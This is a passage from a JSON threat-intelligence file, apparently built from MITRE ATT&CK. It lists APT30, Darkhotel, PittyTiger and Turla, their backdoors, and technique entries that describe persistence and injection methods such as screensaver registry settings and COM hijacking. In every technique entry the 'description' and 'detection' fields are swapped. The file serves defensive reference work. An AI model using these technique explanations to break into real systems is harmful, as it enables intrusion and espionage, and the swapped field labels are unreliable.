                "description": "NETEAGLE is a backdoor developed by APT30 with compile dates as early as 2008. It has two main variants known as “Scout” and “Norton.”",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1568": "Dynamic Resolution",
                    "T1059.003": "Windows Command Shell",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1095": "Non-Application Layer Protocol",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1071": "Application Layer Protocol",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 12
        },
        {
            "id": "S0031",
            "type": "tool",
            "attributes": {
                "name": "BACKSPACE",
                "aliases": [
                    "Lecna"
                ],
                "labels": [
                    "malware"
                ],
                "description": "BACKSPACE is a backdoor used by APT30 that dates back to at least 2005.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1132.002": "Non-Standard Encoding",
                    "T1090.001": "Internal Proxy",
                    "T1059.003": "Windows Command Shell",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1112": "Modify Registry",
                    "T1104": "Multi-Stage Channels",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1012": "Query Registry"
                }
            },
            "val": 14
        },
        {
            "id": "S0028",
            "type": "tool",
            "attributes": {
                "name": "SHIPSHAPE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SHIPSHAPE is malware developed by APT30 that allows propagation and exfiltration of data over removable devices. APT30 may use this capability to exfiltrate data across air-gaps.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1091": "Replication Through Removable Media"
                }
            },
            "val": 3
        },
        {
            "id": "G0012",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "Darkhotel",
                "aliases": [
                    "DUBNIUM"
                ],
                "description": "Darkhotel is a suspected South Korean threat group that has targeted victims primarily in East Asia since at least 2004. The group's name is based on cyber espionage operations conducted via hotel Internet networks against traveling executives and other select guests. Darkhotel has also conducted spearphishing campaigns and infected victims through peer-to-peer and file sharing networks.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1204.002": "Malicious File",
                    "T1059.003": "Windows Command Shell",
                    "T1497.002": "User Activity Based Checks",
                    "T1497.001": "System Checks",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1056.001": "Keylogging",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1553.002": "Code Signing",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1497": "Virtualization/Sandbox Evasion",
                    "T1189": "Drive-by Compromise",
                    "T1203": "Exploitation for Client Execution",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1091": "Replication Through Removable Media",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1080": "Taint Shared Content",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            }
        },
        {
            "id": "G0011",
            "type": "group",
            "attributes": {
                "val": 5,
                "name": "PittyTiger",
                "aliases": [],
                "description": "PittyTiger is a threat group believed to operate out of China that uses multiple different types of malware to maintain command and control.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0032": "gh0st RAT",
                    "S0012": "PoisonIvy",
                    "S0010": "Lurid",
                    "S0008": "gsecdump",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1078": "Valid Accounts"
                }
            }
        },
        {
            "id": "S0010",
            "type": "tool",
            "attributes": {
                "name": "Lurid",
                "aliases": [
                    "Enfal"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Lurid is a malware family that has been used by several groups, including PittyTiger, in targeted attacks as far back as 2006.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1560": "Archive Collected Data"
                }
            },
            "val": 2
        },
        {
            "id": "G0010",
            "type": "group",
            "attributes": {
                "val": 25,
                "name": "Turla",
                "aliases": [
                    "Group 88",
                    "Belugasturgeon",
                    "Waterbug",
                    "WhiteBear",
                    "VENOMOUS BEAR",
                    "Snake",
                    "Krypton"
                ],
                "description": "Turla is a Russian-based threat group that has infected victims in over 45 countries, spanning a range of industries including government, embassies, military, education, research and pharmaceutical companies since 2004. Heightened activity was seen in mid-2015. Turla is known for conducting watering hole and spearphishing campaigns and leveraging in-house tools and malware. Turla’s espionage platform is mainly used against Windows machines, but has also been seen used against macOS and Linux machines.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0590": "NBTscan",
                    "S0587": "Penquin",
                    "S0581": "IronNetInjector",
                    "S0538": "Crutch",
                    "S0537": "HyperStack",
                    "S0395": "LightNeuron",
                    "S0393": "PowerStallion",
                    "S0363": "Empire",
                    "S0335": "Carbon",
                    "S0256": "Mosquito",
                    "S0265": "Kazuar",
                    "S0168": "Gazer",
                    "S0160": "certutil",
                    "S0126": "ComRAT",
                    "S0104": "netstat",
                    "S0102": "nbtstat",
                    "S0099": "Arp",
                    "S0096": "Systeminfo",
                    "S0091": "Epic",
                    "S0075": "Reg",
                    "S0057": "Tasklist",
                    "S0039": "Net",
                    "S0029": "PsExec",
                    "S0022": "Uroburos",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1553.006": "Code Signing Policy Modification",
                    "T1016.001": "Internet Connection Discovery",
                    "T1555.004": "Windows Credential Manager",
                    "T1588.001": "Malware",
                    "T1587.001": "Malware",
                    "T1584.006": "Web Services",
                    "T1584.004": "Server",
                    "T1584.003": "Virtual Private Server",
                    "T1583.006": "Web Services",
                    "T1059.007": "JavaScript",
                    "T1027.005": "Indicator Removal from Tools",
                    "T1071.003": "Mail Protocols",
                    "T1071.001": "Web Protocols",
                    "T1102.002": "Bidirectional Communication",
                    "T1078.003": "Local Accounts",
                    "T1069.001": "Local Groups",
                    "T1570": "Lateral Tool Transfer",
                    "T1204.001": "Malicious Link",
                    "T1567.002": "Exfiltration to Cloud Storage",
                    "T1059.006": "Python",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1518.001": "Security Software Discovery",
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1562.001": "Disable or Modify Tools",
                    "T1560.001": "Archive via Utility",
                    "T1134.002": "Create Process with Token",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1547.004": "Winlogon Helper DLL",
                    "T1546.013": "PowerShell Profile",
                    "T1546.003": "Windows Management Instrumentation Event Subscription",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1189": "Drive-by Compromise",
                    "T1213": "Data from Information Repositories",
                    "T1201": "Password Policy Discovery",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1120": "Peripheral Device Discovery",
                    "T1112": "Modify Registry",
                    "T1110": "Brute Force",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1102": "Web Service",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1049": "System Network Connections Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1025": "Data from Removable Media",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0587",
            "type": "tool",
            "attributes": {
                "name": "Penquin",
                "aliases": [
                    "Penquin 2.0",
                    "Penquin_x64"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Penquin is a remote access trojan (RAT) with multiple versions used by Turla to target Linux systems since at least 2014.",
                "platforms": [
                    "Linux"
                ],
                "techniques": {
                    "T1027.005": "Indicator Removal from Tools",
                    "T1573.002": "Asymmetric Cryptography",
                    "T1059.004": "Unix Shell",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1222.002": "Linux and Mac File and Directory Permissions Modification",
                    "T1070.004": "File Deletion",
                    "T1053.003": "Cron",
                    "T1205": "Traffic Signaling",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1040": "Network Sniffing",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 16
        },
        {
            "id": "S0581",
            "type": "tool",
            "attributes": {
                "name": "IronNetInjector",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "IronNetInjector is a Turla toolchain that utilizes scripts from the open-source IronPython implementation of Python with a .NET injector to drop one or more payloads including ComRAT.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.006": "Python",
                    "T1036.004": "Masquerade Task or Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 8
        },
        {
            "id": "S0538",
            "type": "tool",
            "attributes": {
                "name": "Crutch",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Crutch is a backdoor designed for document theft that has been used by Turla since at least 2015.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1102.002": "Bidirectional Communication",
                    "T1074.001": "Local Data Staging",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1567.002": "Exfiltration to Cloud Storage",
                    "T1560.001": "Archive via Utility",
                    "T1036.004": "Masquerade Task or Service",
                    "T1053.005": "Scheduled Task",
                    "T1120": "Peripheral Device Discovery",
                    "T1119": "Automated Collection",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1025": "Data from Removable Media",
                    "T1020": "Automated Exfiltration",
                    "T1008": "Fallback Channels",
                    "T1005": "Data from Local System"
                }
            },
            "val": 15
        },
        {
            "id": "T1078.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Default Accounts",
                "chain_phase": "defense-evasion",
                "description": "Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.",
                "detection": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1559",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Inter-Process Communication",
                "chain_phase": "execution",
                "description": "Monitor for strings in files/commands, loaded DLLs/libraries, or spawned processes that are associated with abuse of IPC mechanisms.",
                "detection": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows Dynamic Data Exchange or Component Object Model. Higher level execution mediums, such as those of Command and Scripting Interpreters, may also leverage underlying IPC mechanisms.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0537",
            "type": "tool",
            "attributes": {
                "name": "HyperStack",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "HyperStack is a RPC-based backdoor used by Turla since at least 2018. HyperStack has similarities to other backdoors used by Turla including Carbon.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1078.001": "Default Accounts",
                    "T1087.001": "Local Account",
                    "T1559": "Inter-Process Communication",
                    "T1112": "Modify Registry",
                    "T1106": "Native API"
                }
            },
            "val": 6
        },
        {
            "id": "T1565.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Transmitted Data Manipulation",
                "chain_phase": "impact",
                "description": "Detecting the manipulation of data as at passes over a network can be difficult without the appropriate tools. In some cases integrity verification checks, such as file hashing, may be used on critical files as they transit a network. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data. ",
                "detection": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1505.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Transport Agent",
                "chain_phase": "persistence",
                "description": "Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.",
                "detection": "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails. Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events. Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0395",
            "type": "tool",
            "attributes": {
                "name": "LightNeuron",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "LightNeuron is a sophisticated backdoor that has targeted Microsoft Exchange servers since at least 2014. LightNeuron has been used by Turla to target diplomatic and foreign affairs-related organizations. The presence of certain strings in the malware suggests a Linux variant of LightNeuron exists.",
                "platforms": [
                    "Windows",
                    "Linux"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.003": "Mail Protocols",
                    "T1001.002": "Steganography",
                    "T1074.001": "Local Data Staging",
                    "T1059.003": "Windows Command Shell",
                    "T1565.002": "Transmitted Data Manipulation",
                    "T1560": "Archive Collected Data",
                    "T1114.002": "Remote Email Collection",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1505.002": "Transport Agent",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1119": "Automated Collection",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1029": "Scheduled Transfer",
                    "T1027": "Obfuscated Files or Information",
                    "T1020": "Automated Exfiltration",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 22
        },
        {
            "id": "S0393",
            "type": "tool",
            "attributes": {
                "name": "PowerStallion",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "PowerStallion is a lightweight PowerShell backdoor used by Turla, possibly as a recovery access tool to install other backdoors.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.002": "Bidirectional Communication",
                    "T1059.001": "PowerShell",
                    "T1070.006": "Timestomp",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 5
        },
        {
            "id": "S0335",
            "type": "tool",
            "attributes": {
                "name": "Carbon",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Carbon is a sophisticated, second-stage backdoor and framework that can be used to steal sensitive information from victims. Carbon has been selectively used by Turla to target government and foreign affairs-related organizations in Central Asia.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1074.001": "Local Data Staging",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1102": "Web Service",
                    "T1095": "Non-Application Layer Protocol",
                    "T1069": "Permission Groups Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry"
                }
            },
            "val": 19
        },
        {
            "id": "T1546.015",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Component Object Model Hijacking",
                "chain_phase": "privilege-escalation",
                "description": "There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: [Reg](https://attack.mitre.org/software/S0075)) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\.(Citation: Elastic COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  \n\nLikewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed. ",
                "detection": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0256",
            "type": "tool",
            "attributes": {
                "name": "Mosquito",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Mosquito is a Win32 backdoor that has been used by Turla. Mosquito is made up of three parts: the installer, the launcher, and the backdoor. The main backdoor is called CommanderDLL and is launched by the loader program.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1546.015": "Component Object Model Hijacking",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1518.001": "Security Software Discovery",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 16
        },
        {
            "id": "S0265",
            "type": "tool",
            "attributes": {
                "name": "Kazuar",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Kazuar is a fully featured, multi-platform backdoor Trojan written using the Microsoft .NET framework.",
                "platforms": [
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1071.002": "File Transfer Protocols",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1090.001": "Internal Proxy",
                    "T1102.002": "Bidirectional Communication",
                    "T1074.001": "Local Data Staging",
                    "T1069.001": "Local Groups",
                    "T1059.004": "Unix Shell",
                    "T1059.003": "Windows Command Shell",
                    "T1087.001": "Local Account",
                    "T1070.004": "File Deletion",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1485": "Data Destruction",
                    "T1125": "Video Capture",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1033": "System Owner/User Discovery",
                    "T1029": "Scheduled Transfer",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1010": "Application Window Discovery",
                    "T1008": "Fallback Channels",
                    "T1005": "Data from Local System"
                }
            },
            "val": 30
        },
        {
            "id": "T1546.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Screensaver",
                "chain_phase": "privilege-escalation",
                "description": "Monitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.\n\nTools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated.",
                "detection": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0168",
            "type": "tool",
            "attributes": {
                "name": "Gazer",
                "aliases": [
                    "WhiteBear"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Gazer is a backdoor used by Turla since at least 2016.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1564.004": "NTFS File Attributes",
                    "T1553.002": "Code Signing",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1547.009": "Shortcut Modification",
                    "T1547.004": "Winlogon Helper DLL",
                    "T1546.002": "Screensaver",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.003": "Thread Execution Hijacking",
                    "T1053.005": "Scheduled Task",
                    "T1105": "Ingress Tool Transfer",
                    "T1055": "Process Injection",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 17
        },
        {
            "id": "T1564.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Hidden File System",
                "chain_phase": "defense-evasion",
                "description": "Detecting the use of a hidden file system may be exceptionally difficult depending on the implementation. Emphasis may be placed on detecting related aspects of the adversary lifecycle, such as how malware interacts with the hidden file system or how a hidden file system is loaded. Consider looking for anomalous interactions with the Registry or with a particular file on disk. Likewise, if the hidden file system is loaded on boot from reserved disk space, consider shifting focus to detecting [Bootkit](https://attack.mitre.org/techniques/T1542/003) activity.",
                "detection": "Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions. Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system. Adversaries may also fragment files across the existing file system structure in non-standard ways.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0126",
            "type": "tool",
            "attributes": {
                "name": "ComRAT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "ComRAT is a second stage implant suspected of being a descendant of Agent.btz and used by Turla. The first version of ComRAT was identified in 2007, but the tool has undergone substantial development for many years since.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1564.005": "Hidden File System",
                    "T1573.002": "Asymmetric Cryptography",
                    "T1546.015": "Component Object Model Hijacking",
                    "T1071.003": "Mail Protocols",
                    "T1071.001": "Web Protocols",
                    "T1102.002": "Bidirectional Communication",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1036.004": "Masquerade Task or Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1053.005": "Scheduled Task",
                    "T1518": "Software Discovery",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1029": "Scheduled Transfer",
                    "T1027": "Obfuscated Files or Information",
                    "T1012": "Query Registry"
                }
            },
            "val": 19
        },
        {
            "id": "S0102",
            "type": "tool",
            "attributes": {
                "name": "nbtstat",
                "aliases": [
                    "nbtstat.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "nbtstat is a utility used to troubleshoot NetBIOS name resolution.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1049": "System Network Connections Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 2
        },
        {
            "id": "T1055.011",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Extra Window Memory Injection",
                "chain_phase": "defense-evasion",
                "description": "Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong (Citation: Microsoft GetWindowLong function) and SetWindowLong (Citation: Microsoft SetWindowLong function). Malware associated with this technique have also used SendNotifyMessage (Citation: Microsoft SendNotifyMessage function) to trigger the associated window procedure and eventual malicious injection. (Citation: Elastic Process Injection July 2017)",
                "detection": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.  \n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>. More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.   \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0091",
            "type": "tool",
            "attributes": {
                "name": "Epic",
                "aliases": [
                    "Tavdig",
                    "Wipbot",
                    "WorldCupSec",
                    "TadjMakhal"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Epic is a backdoor that has been used by Turla.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1069.001": "Local Groups",
